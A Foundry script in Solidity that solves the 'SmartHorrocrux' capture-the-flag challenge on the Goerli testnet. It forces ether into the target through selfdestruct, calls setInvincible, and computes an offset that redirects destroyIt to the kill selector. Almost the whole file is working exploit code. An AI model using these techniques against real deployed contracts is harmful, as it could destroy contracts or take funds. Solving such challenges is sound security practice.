// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/ChallengeSmartHorrocrux.sol";

contract FundContract {
    constructor(address instance) payable {
        selfdestruct(payable(instance));
    }
}

contract Hack {
    bytes32 private constant spell = 0x45746865724b6164616272610000000000000000000000000000000000000000;

    constructor(SmartHorrocrux horrocrux) payable {
        require(msg.value == 1);

        // Empty contract
        (bool success,) = address(horrocrux).call("");
        require(success, "failed to execute fallback");
        // set balance to 1
        new FundContract{value: 1}(address(horrocrux));
        horrocrux.setInvincible();

        // calculate offset to kill selector
        uint256 magic = uint256(spell) - (uint256(uint32(SmartHorrocrux.kill.selector)) << ((32 - 4) * 8));

        // kill it!
        horrocrux.destroyIt("EtherKadabra", magic);

        selfdestruct(payable(msg.sender));
    }
}

// https://goerli.etherscan.io/address/0x244a40Acd988EA5eE1827a57F01D839C2c9ed728
contract ChallengeSmartHorrocruxScript is Script {
    address constant instance = 0x244a40Acd988EA5eE1827a57F01D839C2c9ed728;

    function run() public {
        vm.startBroadcast();

        SmartHorrocrux horrocrux = SmartHorrocrux(instance);
        new Hack{value: 1}(horrocrux);

        console.log("alive", horrocrux.alive());
        console.log("code length", address(horrocrux).code.length);
    }
}
